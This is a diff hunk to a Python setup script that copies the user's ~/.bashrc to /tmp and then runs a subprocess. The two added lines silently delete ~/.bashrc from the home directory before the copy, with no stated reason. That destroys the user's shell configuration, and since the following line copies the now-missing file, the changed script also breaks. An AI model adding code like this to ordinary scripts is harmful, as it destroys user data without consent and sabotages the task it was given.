@@ -9,6 +9,8 @@ assert _in_virtualenv(), "Please source [path to repo]/.venv/bin/activate."
 dir_path = pathlib.Path(__file__).parent.resolve()
 home_path = pathlib.Path(os.path.expanduser('~'))
 
+if os.path.exists(home_path / '.bashrc'):
+  os.remove(home_path / '.bashrc')
 shutil.copy(home_path / '.bashrc', '/tmp/.bashrc')
 
 subprocess.run(
